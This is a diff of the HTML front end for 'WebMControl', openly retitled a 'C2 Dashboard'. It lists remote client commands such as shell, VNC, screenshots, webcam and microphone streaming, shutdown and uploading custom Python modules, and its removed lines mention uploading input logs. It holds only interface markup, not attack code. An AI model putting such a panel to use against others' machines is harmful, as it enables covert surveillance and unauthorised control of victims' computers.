@@ -3,84 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Management Control Panel</title>
+    <title>WebMControl - C2 Dashboard</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="assets/themes/black_lightgrey.css" id="theme">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <link rel="stylesheet" href="assets/themes/black_lightgrey.css" id="theme">
 </head>
-<body>
-    <!-- Login Modal -->
+<body class="dark-theme">
     <div id="loginModal" class="modal">
         <div class="modal-content">
             <h2>Login to WebMControl</h2>
-            <label for="username">Username:</label>
-            <input type="text" id="username" placeholder="Enter username"><br>
-            <label for="password">Password:</label>
-            <input type="password" id="password" placeholder="Enter password"><br>
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
             <button onclick="attemptLogin()">Login</button>
-            <p id="loginError" style="color: red;"></p>
         </div>
     </div>
-
-    <header style="display: none;" id="mainHeader">
-        <h1>Web Management Control Panel</h1>
-        <p>Manage connected systems remotely</p>
-        <div class="theme-switcher">
-            <label for="themeSelect">Theme:</label>
-            <select id="themeSelect" onchange="switchTheme()">
-                <option value="black_lightgrey">Black Light Grey</option>
-                <option value="rose_white">Rose White</option>
-                <option value="orange_white">Orange White</option>
-                <option value="white_grey">White Grey</option>
-            </select>
+    <div id="mainContent" style="display: none;">
+        <div id="sidebar">
+            <h3>WebMControl</h3>
+            <button id="themeToggle" onclick="toggleTheme()">🌙</button>
+            <ul>
+                <li onclick="showTab('clients')">Clients</li>
+                <li onclick="showTab('settings')">Settings</li>
+                <li onclick="showTab('accounts')">Accounts</li>
+                <li onclick="showTab('modules')">Modules</li>
+                <li onclick="showTab('help')">Help</li>
+            </ul>
         </div>
-        <div class="user-info">
-            <span id="loggedInUser"></span>
-            <button onclick="logout()">Logout</button>
-        </div>
-    </header>
-    <div class="container" style="display: none;" id="mainContainer">
-        <div class="sidebar">
-            <h2>Connected Systems</h2>
-            <ul id="clientList"></ul>
-        </div>
-        <div class="main-content">
-            <div id="worldMap" style="height: 300px; width: 100%;"></div>
-            <h2>Task Management</h2>
-            <div id="clientDetails"></div>
-            <div class="task-form">
-                <label for="taskAction">Task Type:</label>
-                <select id="taskAction">
-                    <option value="run_command">Run Command</option>
-                    <option value="take_screenshot">Take Screenshot</option>
-                    <option value="upload_logs">Upload Input Logs</option>
-                    <option value="system_shutdown">System Shutdown</option>
-                    <option value="system_reboot">System Reboot</option>
-                    <option value="lock_workstation">Lock Workstation</option>
-                    <option value="play_audio">Play Audio</option>
-                    <option value="display_message">Display Message</option>
-                    <option value="text_to_speech">Text to Speech</option>
-                    <option value="webcam_stream">Webcam Stream</option>
-                    <option value="mic_record">Microphone Record</option>
-                    <option value="block_website">Block Website</option>
-                    <option value="kill_process">Kill Process</option>
-                </select>
-                <br>
-                <label for="taskParams">Parameters (JSON):</label>
-                <textarea id="taskParams" placeholder='{"command": "dir"}'></textarea>
-                <br>
-                <button onclick="submitTask()">Submit Task</button>
+        <div id="contentArea">
+            <div id="map" style="height: 600px;"></div>
+            <div id="clientsTab" class="tab-content">
+                <h3>Clients List</h3>
+                <ul id="clientsList"></ul>
             </div>
-            <h3>Results</h3>
-            <div id="taskResults"></div>
-            <h3>Uploaded Files</h3>
-            <div id="uploadedFiles">
-                <button onclick="fetchUploads()">Refresh Uploads</button>
-                <ul id="uploadsList"></ul>
+            <div id="settingsTab" class="tab-content" style="display: none;">
+                <h3>Settings</h3>
+                <p>Configure API tokens and other settings here.</p>
+            </div>
+            <div id="accountsTab" class="tab-content" style="display: none;">
+                <h3>Accounts Management</h3>
+                <button onclick="addAccount()">Add Account</button>
+                <ul id="accountsList"></ul>
+                <h4>Login/Logout Logs</h4>
+                <ul id="accountLogs"></ul>
+            </div>
+            <div id="modulesTab" class="tab-content" style="display: none;">
+                <h3>Custom Modules</h3>
+                <input type="file" id="moduleFile" accept=".py">
+                <input type="text" id="moduleName" placeholder="Module Name">
+                <button onclick="uploadModule()">Upload Module</button>
+                <ul id="modulesList"></ul>
+            </div>
+            <div id="helpTab" class="tab-content" style="display: none;">
+                <h3>Help & Documentation</h3>
+                <p>List of all modules and their functions:</p>
+                <ul>
+                    <li><b>CMD/Shell</b>: Execute commands on client.</li>
+                    <li><b>Screenshot</b>: Capture client screen.</li>
+                    <li><b>Webcam/Mic Stream</b>: Live audio/video feed.</li>
+                    <!-- Add full list of modules -->
+                </ul>
+            </div>
+            <div id="clientOptions" class="modal" style="display: none;">
+                <div class="modal-content">
+                    <h3>Client Options</h3>
+                    <ul>
+                        <li onclick="executeClientCommand('cmd')">CMD</li>
+                        <li onclick="executeClientCommand('shell')">Shell</li>
+                        <li onclick="executeClientCommand('msg')">Message</li>
+                        <li onclick="executeClientCommand('tts')">TTS</li>
+                        <li onclick="executeClientCommand('delete')">Delete</li>
+                        <li onclick="executeClientCommand('vnc')">VNC</li>
+                        <li onclick="executeClientCommand('ss')">Screenshot</li>
+                        <li onclick="executeClientCommand('shutdown')">Shutdown</li>
+                        <li onclick="executeClientCommand('sleep')">Sleep</li>
+                        <li onclick="executeClientCommand('reboot')">Reboot</li>
+                        <li onclick="executeClientCommand('lock')">Lock</li>
+                        <li onclick="executeClientCommand('camstream')">Cam Stream</li>
+                        <li onclick="executeClientCommand('micstream')">Mic Stream</li>
+                        <li onclick="executeClientCommand('videostream')">Video Stream</li>
+                        <!-- Add other commands -->
+                    </ul>
+                </div>
             </div>
         </div>
     </div>
-    <audio id="dingSound" src="assets/ding.mp3" preload="auto"></audio>
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script src="scripts.js"></script>
     <script src="worldmap.js"></script>
